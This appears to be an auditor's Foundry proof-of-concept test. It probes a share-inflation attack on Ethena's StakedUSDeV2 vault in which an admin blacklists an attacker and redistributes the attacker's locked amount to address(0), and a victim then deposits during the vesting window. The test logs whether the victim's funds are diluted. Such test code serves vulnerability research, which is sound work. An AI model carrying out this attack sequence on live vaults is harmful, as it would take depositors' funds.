// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "ethena/contracts/StakedUSDe.sol";
import "ethena/contracts/StakedUSDeV2.sol";
import "ethena/contracts/USDeSilo.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockUSDe is ERC20 {
    constructor() ERC20("USDe", "USDe") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract StakedUSDeDonationTest is Test {
    StakedUSDeV2 public vault;
    MockUSDe public usde;
    address public admin = address(0xAD);
    address public rewarder = address(0xFEED);
    address public attacker = address(0xA);
    address public victim = address(0xB);

    function setUp() public {
        usde = new MockUSDe();
        // Deploy with admin as owner to grant DEFAULT_ADMIN_ROLE and BLACKLIST_MANAGER_ROLE
        vault = new StakedUSDeV2(IERC20(address(usde)), rewarder, admin);
        
        // Grant BLACKLIST_MANAGER_ROLE to admin so they can call addToBlacklist
        vm.prank(admin);
        vault.grantRole(keccak256("BLACKLIST_MANAGER_ROLE"), admin);

        // Fund accounts
        usde.mint(attacker, 100 ether);
        usde.mint(victim, 100 ether);
        usde.mint(rewarder, 1000 ether);

        vm.prank(attacker);
        usde.approve(address(vault), type(uint256).max);
        vm.prank(victim);
        usde.approve(address(vault), type(uint256).max);
        vm.prank(rewarder);
        usde.approve(address(vault), type(uint256).max);
    }

    function testDonationAttackViaRedistribute() public {
        // 1. Attacker deposits MIN_SHARES to initialize
        vm.prank(attacker);
        vault.deposit(1 ether, attacker);
        assertEq(vault.totalSupply(), 1 ether);

        // 2. Admin blacklists attacker as FULL_RESTRICTED
        vm.prank(admin);
        vault.addToBlacklist(attacker, true);

        // 3. Admin redistributes to address(0) -> burns shares, adds to vesting
        vm.prank(admin);
        vault.redistributeLockedAmount(attacker, address(0));

        // Shares burned, but assets are now in vesting
        assertEq(vault.totalSupply(), 0);
        assertTrue(vault.getUnvestedAmount() > 0);

        // 4. Victim deposits during vesting window
        vm.warp(block.timestamp + 1 hours); // Partial vesting
        vm.prank(victim);
        uint256 victimShares = vault.deposit(1 ether, victim);

        // 5. Fast forward past vesting period
        vm.warp(block.timestamp + 8 hours);

        // 6. Check if victim's share value was inflated
        uint256 victimAssets = vault.previewRedeem(victimShares);
        console.log("Victim deposited: 1 ether");
        console.log("Victim redeemable:", victimAssets);
        
        // If victimAssets < 1 ether, attack succeeded (victim lost funds to inflation)
        // If victimAssets >= 1 ether, protection worked or attack failed
        if (victimAssets < 1 ether) {
            console.log("ATTACK SUCCESSFUL: Share inflation detected");
        } else {
            console.log("Attack mitigated or not exploitable in this path");
        }
    }
}
